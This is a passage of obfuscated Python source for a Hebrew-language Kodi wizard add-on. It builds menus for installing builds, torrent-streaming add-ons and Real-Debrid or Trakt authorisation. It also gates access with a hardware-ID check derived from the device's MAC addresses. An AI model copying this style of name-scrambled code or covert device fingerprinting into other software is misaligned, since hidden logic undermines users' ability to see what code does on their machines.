							OOOO0OOO0000OOO00 =OOOO0OOO0000OOO00 [1 :OOOO0OOO0000OOO00 .rfind (OOOOO0OOO0OOO000O )]#line:1708
					else :#line:1709
						if OOOO0OOO0000OOO00 .find (" ")>0 :#line:1710
							OOOO0OOO0000OOO00 =OOOO0OOO0000OOO00 [:OOOO0OOO0000OOO00 .find (" ")]#line:1711
						elif OOOO0OOO0000OOO00 .find ("/")>0 :#line:1712
							OOOO0OOO0000OOO00 =OOOO0OOO0000OOO00 [:OOOO0OOO0000OOO00 .find ("/")]#line:1713
						elif OOOO0OOO0000OOO00 .find (">")>0 :#line:1714
							OOOO0OOO0000OOO00 =OOOO0OOO0000OOO00 [:OOOO0OOO0000OOO00 .find (">")]#line:1715
					O00OOO00OO00000O0 .append (OOOO0OOO0000OOO00 .strip ())#line:1717
			O0OO00OOO0000O0OO =O00OOO00OO00000O0 #line:1718
		else :#line:1719
			O00OOO00OO00000O0 =[]#line:1720
			for O0000O0O0000OOOO0 in O0OO00OOO0000O0OO :#line:1721
				O0OO00000OOOOOO00 =u"</"+name #line:1722
				OO000000OO0OOOOOO =O0O00O00OO0O0OO0O .find (O0000O0O0000OOOO0 )#line:1724
				O0O00O000O0OOOO00 =O0O00O00OO0O0OO0O .find (O0OO00000OOOOOO00 ,OO000000OO0OOOOOO )#line:1725
				OO0OO000O000O0OOO =O0O00O00OO0O0OO0O .find ("<"+name ,OO000000OO0OOOOOO +1 )#line:1726
				while OO0OO000O000O0OOO <O0O00O000O0OOOO00 and OO0OO000O000O0OOO !=-1 :#line:1728
					OOO00O0O00O0O0O0O =O0O00O00OO0O0OO0O .find (O0OO00000OOOOOO00 ,O0O00O000O0OOOO00 +len (O0OO00000OOOOOO00 ))#line:1729
					if OOO00O0O00O0O0O0O !=-1 :#line:1730
						O0O00O000O0OOOO00 =OOO00O0O00O0O0O0O #line:1731
					OO0OO000O000O0OOO =O0O00O00OO0O0OO0O .find ("<"+name ,OO0OO000O000O0OOO +1 )#line:1732
				if OO000000OO0OOOOOO ==-1 and O0O00O000O0OOOO00 ==-1 :#line:1734
					O0OO000O0O0O000OO =u""#line:1735
				elif OO000000OO0OOOOOO >-1 and O0O00O000O0OOOO00 >-1 :#line:1736
					O0OO000O0O0O000OO =O0O00O00OO0O0OO0O [OO000000OO0OOOOOO +len (O0000O0O0000OOOO0 ):O0O00O000O0OOOO00 ]#line:1737
				elif O0O00O000O0OOOO00 >-1 :#line:1738
					O0OO000O0O0O000OO =O0O00O00OO0O0OO0O [:O0O00O000O0OOOO00 ]#line:1739
				elif OO000000OO0OOOOOO >-1 :#line:1740
					O0OO000O0O0O000OO =O0O00O00OO0O0OO0O [OO000000OO0OOOOOO +len (O0000O0O0000OOOO0 ):]#line:1741
				if ret :#line:1743
					O0OO00000OOOOOO00 =O0O00O00OO0O0OO0O [O0O00O000O0OOOO00 :O0O00O00OO0O0OO0O .find (">",O0O00O00OO0O0OO0O .find (O0OO00000OOOOOO00 ))+1 ]#line:1744
					O0OO000O0O0O000OO =O0000O0O0000OOOO0 +O0OO000O0O0O000OO +O0OO00000OOOOOO00 #line:1745
				O0O00O00OO0O0OO0O =O0O00O00OO0O0OO0O [O0O00O00OO0O0OO0O .find (O0OO000O0O0O000OO ,O0O00O00OO0O0OO0O .find (O0000O0O0000OOOO0 ))+len (O0OO000O0O0O000OO ):]#line:1747
				O00OOO00OO00000O0 .append (O0OO000O0O0O000OO )#line:1748
			O0OO00OOO0000O0OO =O00OOO00OO00000O0 #line:1749
		O0O0OO00000O00O0O +=O0OO00OOO0000O0OO #line:1750
	return O0O0OO00000O00O0O #line:1752
def addItem (O00O0O0OOOOO0O0OO ,OO0O0O0O0O0OOO00O ,OO0O0O00OOOO00000 ,O00OO0OO0OO000O0O ,OO00OOO00O0O0O000 ,description =None ):#line:1754
	if description ==None :description =''#line:1755
	description ='[COLOR white]'+description +'[/COLOR]'#line:1756
	OO0O0OOOOOOO0O00O =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0O0O0O0O0OOO00O )+"&mode="+str (OO0O0O00OOOO00000 )+"&name="+urllib .quote_plus (O00O0O0OOOOO0O0OO )+"&iconimage="+urllib .quote_plus (O00OO0OO0OO000O0O )+"&fanart="+urllib .quote_plus (OO00OOO00O0O0O000 )#line:1757
	O000OO000O0O0OO00 =True #line:1758
	OO00000000OO0O0OO =xbmcgui .ListItem (O00O0O0OOOOO0O0OO ,iconImage =O00OO0OO0OO000O0O ,thumbnailImage =O00OO0OO0OO000O0O )#line:1759
	OO00000000OO0O0OO .setInfo (type ="Video",infoLabels ={"Title":O00O0O0OOOOO0O0OO ,"Plot":description })#line:1760
	OO00000000OO0O0OO .setProperty ("fanart_Image",OO00OOO00O0O0O000 )#line:1761
	OO00000000OO0O0OO .setProperty ("icon_Image",O00OO0OO0OO000O0O )#line:1762
	O000OO000O0O0OO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0OOOOOOO0O00O ,listitem =OO00000000OO0O0OO ,isFolder =False )#line:1763
	return O000OO000O0O0OO00 #line:1764
def get_params ():#line:1766
		OOO0O00O0OOO0OOO0 =[]#line:1767
		OO00000000O000000 =sys .argv [2 ]#line:1768
		if len (OO00000000O000000 )>=2 :#line:1769
				O0OO000000OOOOOOO =sys .argv [2 ]#line:1770
				O0O0000OO00OO00O0 =O0OO000000OOOOOOO .replace ('?','')#line:1771
				if (O0OO000000OOOOOOO [len (O0OO000000OOOOOOO )-1 ]=='/'):#line:1772
						O0OO000000OOOOOOO =O0OO000000OOOOOOO [0 :len (O0OO000000OOOOOOO )-2 ]#line:1773
				O000000O0O0000O0O =O0O0000OO00OO00O0 .split ('&')#line:1774
				OOO0O00O0OOO0OOO0 ={}#line:1775
				for OO0OO000O000OO00O in range (len (O000000O0O0000O0O )):#line:1776
						OO000OO00OOO0000O ={}#line:1777
						OO000OO00OOO0000O =O000000O0O0000O0O [OO0OO000O000OO00O ].split ('=')#line:1778
						if (len (OO000OO00OOO0000O ))==2 :#line:1779
								OOO0O00O0OOO0OOO0 [OO000OO00OOO0000O [0 ]]=OO000OO00OOO0000O [1 ]#line:1780
		return OOO0O00O0OOO0OOO0 #line:1782
def decode (O0OOOOO0OOOOO000O ,O00OO0O000O0O0OO0 ):#line:1787
    import base64 #line:1788
    OO000O00000O0OO0O =[]#line:1789
    if (len (O0OOOOO0OOOOO000O ))!=4 :#line:1791
     return 10 #line:1792
    O00OO0O000O0O0OO0 =base64 .urlsafe_b64decode (O00OO0O000O0O0OO0 )#line:1793
    for O0O0O000O00OO000O in range (len (O00OO0O000O0O0OO0 )):#line:1795
        O00O0O000000O0OOO =O0OOOOO0OOOOO000O [O0O0O000O00OO000O %len (O0OOOOO0OOOOO000O )]#line:1796
        OOO0OO0O0OO0OOO00 =chr ((256 +ord (O00OO0O000O0O0OO0 [O0O0O000O00OO000O ])-ord (O00O0O000000O0OOO ))%256 )#line:1797
        OO000O00000O0OO0O .append (OOO0OO0O0OO0OOO00 )#line:1798
    return "".join (OO000O00000O0OO0O )#line:1799
def tmdb_list (O00O0OOOO00O0O000 ):#line:1800
    O0OO0OOO000O00000 =decode ("7643",O00O0OOOO00O0O000 )#line:1803
    return int (O0OO0OOO000O00000 )#line:1806
def u_list (O00O00O00O000000O ):#line:1807
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1809
        from math import sqrt #line:1810
        O0OO00OOOOO0O0O00 =tmdb_list (TMDB_NEW_API )#line:1811
        OO00O0O0000OOO00O =str ((getHwAddr ('eth0'))*O0OO00OOOOO0O0O00 )#line:1813
        OOOO0O00O00O0OO0O =int (OO00O0O0000OOO00O [1 ]+OO00O0O0000OOO00O [2 ]+OO00O0O0000OOO00O [5 ]+OO00O0O0000OOO00O [7 ])#line:1814
        OOO000OOO00O0000O =(ADDON .getSetting ("pass"))#line:1816
        O0O0OO00O000000O0 =(str (round (sqrt ((OOOO0O00O00O0OO0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1821
        if '.'in O0O0OO00O000000O0 :#line:1823
         O0O0OO00O000000O0 =(str (round (sqrt ((OOOO0O00O00O0OO0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1824
        if OOO000OOO00O0000O ==O0O0OO00O000000O0 :#line:1826
          OO00000OO00OO00OO =O00O00O00O000000O #line:1828
        else :#line:1830
           if STARTP2 ()and STARTP ()=='ok':#line:1831
             return O00O00O00O000000O #line:1834
           OO00000OO00OO00OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1835
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1836
           sys .exit ()#line:1837
        return OO00000OO00OO00OO #line:1838
    else :#line:1839
        STARTP ()#line:1840
def disply_hwr ():#line:1844
   try :#line:1845
    OO0OOOOO0O00000OO =tmdb_list (TMDB_NEW_API )#line:1846
    O000O000OO00000O0 =str ((getHwAddr ('eth0'))*OO0OOOOO0O00000OO )#line:1847
    O0OO0O00OOO00OOO0 =(O000O000OO00000O0 [1 ]+O000O000OO00000O0 [2 ]+O000O000OO00000O0 [5 ]+O000O000OO00000O0 [7 ])#line:1854
    O00O00OOOO0O0OOOO =(ADDON .getSetting ("action"))#line:1855
    wiz .setS ('action',str (O0OO0O00OOO00OOO0 ))#line:1857
   except :pass #line:1858
def disply_hwr2 ():#line:1859
   try :#line:1860
    OO00O0O0O0OOO0OOO =tmdb_list (TMDB_NEW_API )#line:1861
    O00O00OO0O0O000O0 =str ((getHwAddr ('eth0'))*OO00O0O0O0OOO0OOO )#line:1863
    OOO0OOOO0O0O00O00 =(O00O00OO0O0O000O0 [1 ]+O00O00OO0O0O000O0 [2 ]+O00O00OO0O0O000O0 [5 ]+O00O00OO0O0O000O0 [7 ])#line:1872
    OOOO00OOO0000O000 =(ADDON .getSetting ("action"))#line:1873
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO0OOOO0O0O00O00 )#line:1876
   except :pass #line:1877
def getHwAddr (O00OO00OO00OOO00O ):#line:1879
   import subprocess ,time #line:1880
   O0O000000O0OO0O0O ='windows'#line:1881
   if xbmc .getCondVisibility ('system.platform.android'):#line:1882
       O0O000000O0OO0O0O ='android'#line:1883
   if xbmc .getCondVisibility ('system.platform.android'):#line:1884
     O0OO000000OO00O00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1885
     O0O0000OO000OO000 =re .compile ('link/ether (.+?) brd').findall (str (O0OO000000OO00O00 ))#line:1887
     OOOOO00OOO0O000O0 =0 #line:1888
     for OOOOO00OO00OO0O0O in O0O0000OO000OO000 :#line:1889
      if O0O0000OO000OO000 !='00:00:00:00:00:00':#line:1890
          O0OOOOOO0O00OO000 =OOOOO00OO00OO0O0O #line:1891
          OOOOO00OOO0O000O0 =OOOOO00OOO0O000O0 +int (O0OOOOOO0O00OO000 .replace (':',''),16 )#line:1892
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1894
       O0OO00O0000O0OO0O =0 #line:1895
       OOOOO00OOO0O000O0 =0 #line:1896
       OO0O0O0OO0O0O00OO =[]#line:1897
       O0OO00OOO0O0OO000 =os .popen ("getmac").read ()#line:1898
       O0OO00OOO0O0OO000 =O0OO00OOO0O0OO000 .split ("\n")#line:1899
       for O0OO00O0OO00OOO0O in O0OO00OOO0O0OO000 :#line:1901
            O0OOO0O000OO0OOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OO00O0OO00OOO0O ,re .I )#line:1902
            if O0OOO0O000OO0OOOO :#line:1903
                O0O0000OO000OO000 =O0OOO0O000OO0OOOO .group ().replace ('-',':')#line:1904
                OO0O0O0OO0O0O00OO .append (O0O0000OO000OO000 )#line:1905
                OOOOO00OOO0O000O0 =OOOOO00OOO0O000O0 +int (O0O0000OO000OO000 .replace (':',''),16 )#line:1908
   else :#line:1910
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1911
   try :#line:1928
    return OOOOO00OOO0O000O0 #line:1929
   except :pass #line:1930
def getpass ():#line:1931
	disply_hwr2 ()#line:1933
def setpass ():#line:1934
    OO0O0OOO0OOO00OO0 =xbmcgui .Dialog ()#line:1935
    OO00O000O0O000000 =''#line:1936
    OOOO0O000OOO00000 =xbmc .Keyboard (OO00O000O0O000000 ,'הכנס סיסמה')#line:1938
    OOOO0O000OOO00000 .doModal ()#line:1939
    if OOOO0O000OOO00000 .isConfirmed ():#line:1940
           OOOO0O000OOO00000 =OOOO0O000OOO00000 .getText ()#line:1941
    wiz .setS ('pass',str (OOOO0O000OOO00000 ))#line:1942
def setuname ():#line:1943
    O0O00OO0000O0O0OO =''#line:1944
    O000OOO0O0O00OO00 =xbmc .Keyboard (O0O00OO0000O0O0OO ,'הכנס שם משתמש')#line:1945
    O000OOO0O0O00OO00 .doModal ()#line:1946
    if O000OOO0O0O00OO00 .isConfirmed ():#line:1947
           O0O00OO0000O0O0OO =O000OOO0O0O00OO00 .getText ()#line:1948
           wiz .setS ('user',str (O0O00OO0000O0O0OO ))#line:1949
def powerkodi ():#line:1950
    os ._exit (1 )#line:1951
def buffer1 ():#line:1953
	OOOOO0O000O00O000 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1954
	O000OOOOO000OO0O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1955
	O0O00O0O00000OOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1956
	OO0000000000OO0OO =re .sub ('[^0-9]','',O0O00O0O00000OOO0 )#line:1957
	OO0000000000OO0OO =int (OO0000000000OO0OO )/3 #line:1958
	OOO00O0OO00O00O0O =OO0000000000OO0OO *1024 *1024 #line:1959
	try :O0OO0O0OO0OOOOO0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1960
	except :O0OO0O0OO0OOOOO0O =16 #line:1961
	OO0O0O0O00O0O00O0 =DIALOG .yesno ('FREE MEMORY: '+str (O0O00O0O00000OOO0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0000000000OO0OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1964
	if OO0O0O0O00O0O00O0 ==1 :#line:1965
		with open (OOOOO0O000O00O000 ,"w")as O0O0O0OO00O00OO00 :#line:1966
			if O0OO0O0OO0OOOOO0O >=17 :O0OO00OO0OO00OO00 =xml_data_advSettings_New (str (OOO00O0OO00O00O0O ))#line:1967
			else :O0OO00OO0OO00OO00 =xml_data_advSettings_old (str (OOO00O0OO00O00O0O ))#line:1968
			O0O0O0OO00O00OO00 .write (O0OO00OO0OO00OO00 )#line:1970
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00O0OO00O00O0O ),'Please restart Kodi for settings to apply.','')#line:1971
	elif OO0O0O0O00O0O00O0 ==0 :#line:1973
		OOO00O0OO00O00O0O =_O000O0OOOOO00OO0O (default =str (OOO00O0OO00O00O0O ),heading ="INPUT BUFFER SIZE")#line:1974
		with open (OOOOO0O000O00O000 ,"w")as O0O0O0OO00O00OO00 :#line:1975
			if O0OO0O0OO0OOOOO0O >=17 :O0OO00OO0OO00OO00 =xml_data_advSettings_New (str (OOO00O0OO00O00O0O ))#line:1976
			else :O0OO00OO0OO00OO00 =xml_data_advSettings_old (str (OOO00O0OO00O00O0O ))#line:1977
			O0O0O0OO00O00OO00 .write (O0OO00OO0OO00OO00 )#line:1978
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00O0OO00O00O0O ),'Please restart Kodi for settings to apply.','')#line:1979
def xml_data_advSettings_old (O000OO0O0OO0OOOOO ):#line:1980
	OO0OOOOO0O0O00O0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O000OO0O0OO0OOOOO #line:1990
	return OO0OOOOO0O0O00O0O #line:1991
def xml_data_advSettings_New (O0OOO000OOOO0O0O0 ):#line:1993
	O00OOO000O000O00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0OOO000OOOO0O0O0 #line:2005
	return O00OOO000O000O00O #line:2006
def write_ADV_SETTINGS_XML (OOOOOOOOO000OOOO0 ):#line:2007
    if not os .path .exists (xml_file ):#line:2008
        with open (xml_file ,"w")as O000000O00OOO000O :#line:2009
            O000000O00OOO000O .write (xml_data )#line:2010
def _O000O0OOOOO00OO0O (default ="",heading ="",hidden =False ):#line:2011
    ""#line:2012
    O0OO00OOO0OOO0OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2013
    O0OO00OOO0OOO0OO0 .doModal ()#line:2014
    if (O0OO00OOO0OOO0OO0 .isConfirmed ()):#line:2015
        return unicode (O0OO00OOO0OOO0OO0 .getText (),"utf-8")#line:2016
    return default #line:2017
def index ():#line:2019
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2020
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2021
	if AUTOUPDATE =='Yes':#line:2022
		if wiz .workingURL (WIZARDFILE )==True :#line:2023
			OOO000000O00O0O0O =wiz .checkWizard ('version')#line:2024
			if OOO000000O00O0O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOO000000O00O0O0O ),'wizardupdate',themeit =THEME2 )#line:2025
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2026
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2028
	if len (BUILDNAME )>0 :#line:2029
		O0OO0O0O0OOO00000 =wiz .checkBuild (BUILDNAME ,'version')#line:2030
		O0O00O00O00000OO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2031
		if O0OO0O0O0OOO00000 >BUILDVERSION :O0O00O00O00000OO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O00O00O00000OO0 ,O0OO0O0O0OOO00000 )#line:2032
		addDir (O0O00O00O00000OO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2034
		try :#line:2036
		     O0O00O00O00O000O0 =wiz .themeCount (BUILDNAME )#line:2037
		except :#line:2038
		   O0O00O00O00O000O0 =False #line:2039
		if not O0O00O00O00O000O0 ==False :#line:2040
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2041
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2042
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2045
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2047
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2051
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2053
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2055
def morsetup ():#line:2057
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2058
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2059
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2060
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2061
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2066
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2067
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2070
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2071
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2081
	setView ('files','viewType')#line:2082
def morsetup2 ():#line:2083
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2084
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2085
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
def fastupdate ():#line:2095
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2096
def forcefastupdate ():#line:2098
			OO0OOO0OOO0O00O0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2099
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OOO0OOO0O00O0O )#line:2100
def rdsetup ():#line:2104
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2105
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2106
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2108
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2109
def traktsetup ():#line:2112
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2113
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	setView ('files','viewType')#line:2120
def setautorealdebrid ():#line:2121
    from resources .libs import real_debrid #line:2122
    OO0OO00O0OOO0O0OO =real_debrid .RealDebridFirst ()#line:2123
    OO0OO00O0OOO0O0OO .auth ()#line:2124
def setrealdebrid ():#line:2126
    OO0O0O00OO000OO00 =(ADDON .getSetting ("auto_rd"))#line:2127
    if OO0O0O00OO000OO00 =='false':#line:2128
       ADDON .openSettings ()#line:2129
    else :#line:2130
        from resources .libs import real_debrid #line:2131
        OO000OO0OO000O0OO =real_debrid .RealDebrid ()#line:2132
        OO000OO0OO000O0OO .auth ()#line:2133
        rdon ()#line:2136
def resolveurlsetup ():#line:2138
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2139
def urlresolversetup ():#line:2140
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2141
def placentasetup ():#line:2143
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2144
def reptiliasetup ():#line:2145
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2146
def flixnetsetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2148
def yodasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2150
def numberssetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2152
def uranussetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2154
def genesissetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2156
def net_tools (view =None ):#line:2158
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2159
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2160
	setView ('files','viewType')#line:2162
def speedMenu ():#line:2163
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2164
def viewIP ():#line:2165
	OO0O0O0OO0OO00O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2179
	OO00000O000OOO0O0 =[];O0OO0OOO0OO0000O0 =0 #line:2180
	for O0O000OO00OOOO00O in OO0O0O0OO0OO00O0O :#line:2181
		O000OOOO000OOOOOO =wiz .getInfo (O0O000OO00OOOO00O )#line:2182
		OOOO00OOO0OOO0O0O =0 #line:2183
		while O000OOOO000OOOOOO =="Busy"and OOOO00OOO0OOO0O0O <10 :#line:2184
			O000OOOO000OOOOOO =wiz .getInfo (O0O000OO00OOOO00O );OOOO00OOO0OOO0O0O +=1 ;wiz .log ("%s sleep %s"%(O0O000OO00OOOO00O ,str (OOOO00OOO0OOO0O0O )));xbmc .sleep (1000 )#line:2185
		OO00000O000OOO0O0 .append (O000OOOO000OOOOOO )#line:2186
		O0OO0OOO0OO0000O0 +=1 #line:2187
	OOO000OOO0OO00O0O ,O0O000O0OO0OO0OO0 ,OOOOO00O00O0O00O0 =getIP ()#line:2188
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00000O000OOO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2189
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOO0OO00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O0OO0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00O00O0O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00000O000OOO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	setView ('files','viewType')#line:2194
def buildMenu ():#line:2196
	if USERNAME =='':#line:2197
		ADDON .openSettings ()#line:2198
		sys .exit ()#line:2199
	if PASSWORD =='':#line:2200
		ADDON .openSettings ()#line:2201
	O0OOO000O0OOO000O =u_list (SPEEDFILE )#line:2202
	(O0OOO000O0OOO000O )#line:2203
	OOO000000O0OO0000 =(wiz .workingURL (O0OOO000O0OOO000O ))#line:2204
	(OOO000000O0OO0000 )#line:2205
	OOO000000O0OO0000 =wiz .workingURL (SPEEDFILE )#line:2206
	if not OOO000000O0OO0000 ==True :#line:2207
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2208
